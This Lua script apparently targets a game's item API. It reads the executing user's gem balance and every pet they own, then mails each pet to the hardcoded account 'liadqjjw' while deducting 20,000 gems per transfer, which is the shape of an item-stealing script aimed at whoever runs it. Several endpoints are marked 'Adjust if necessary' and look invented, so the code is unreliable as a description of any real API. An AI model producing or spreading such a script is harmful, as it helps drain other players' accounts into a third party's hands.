-- Import necessary libraries
local http = require("socket.http")
local ltn12 = require("ltn12")
local json = require("dkjson")

-- API base URL
local baseUrl = "https://biggamesapi.io/api/collections"

-- Function to perform an HTTP GET request
local function httpGet(url, headers)
    local response_body = {}
    local res, code, response_headers = http.request{
        url = url,
        method = "GET",
        headers = headers or { ["Accept"] = "application/json" },
        sink = ltn12.sink.table(response_body)
    }
    if code == 200 then
        return table.concat(response_body)
    else
        error("Failed GET request: " .. tostring(code))
    end
end

-- Function to perform an HTTP POST request
local function httpPost(url, data, headers)
    local response_body = {}
    local res, code, response_headers = http.request{
        url = url,
        method = "POST",
        headers = headers or {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#data)
        },
        source = ltn12.source.string(data),
        sink = ltn12.sink.table(response_body)
    }
    if code == 200 then
        return table.concat(response_body)
    else
        error("Failed POST request: " .. tostring(code))
    end
end

-- Function to teleport the user to the mailbox
local function teleportToMailbox()
    local url = baseUrl .. "/user/teleport" -- Adjust endpoint if necessary
    local payload = json.encode({ location = "mailbox" })
    local response = httpPost(url, payload)
    print("Response from teleporting to mailbox: " .. response)
    
    -- Check if teleportation was successful
    local result = json.decode(response)
    if result.success then
        print("Successfully teleported to mailbox.")
    else
        error("Failed to teleport to mailbox.")
    end
end

-- Function to get all pets for the executing user
local function getAllPets()
    local url = baseUrl .. "/pets" -- Adjust this endpoint if necessary
    local response = httpGet(url)
    local pets, _, err = json.decode(response)
    if err then
        error("Error decoding JSON: " .. err)
    end
    return pets
end

-- Function to get the current gem balance
local function getGemBalance()
    local url = baseUrl .. "/user/gemBalance" -- Adjust this endpoint if necessary
    local response = httpGet(url)
    local balance, _, err = json.decode(response)
    if err then
        error("Error decoding JSON: " .. err)
    end
    return balance
end

-- Function to deduct gems for sending pets
local function deductGems(amount)
    local url = baseUrl .. "/user/deductGems"
    local payload = json.encode({ gems = amount })
    local response = httpPost(url, payload)
    print("Response from deducting gems: " .. response)
end

-- Function to send a pet to another user
local function sendPetToUser(petId, userName)
    local url = baseUrl .. "/mailbox/send"
    local payload = json.encode({
        to = userName,
        petId = petId
    })
    local response = httpPost(url, payload)
    print("Response from sending pet: " .. response)
end

-- Main script execution
local userNameToSend = "liadqjjw"
local gemCostPerTransfer = 20000

-- Teleport the user to the mailbox
teleportToMailbox()

-- Check gem balance and ensure enough gems
local balance = getGemBalance()
if balance < gemCostPerTransfer then
    error("Not enough gems to proceed with transfers.")
end

-- Retrieve all pets for the executing user
local pets = getAllPets()

-- Send each pet to the specified user
for _, pet in ipairs(pets) do
    -- Deduct gems for each transfer
    deductGems(gemCostPerTransfer)

    -- Send the pet to the specified user
    sendPetToUser(pet.id, userNameToSend)
end

print("All pets have been sent to " .. userNameToSend .. ".")
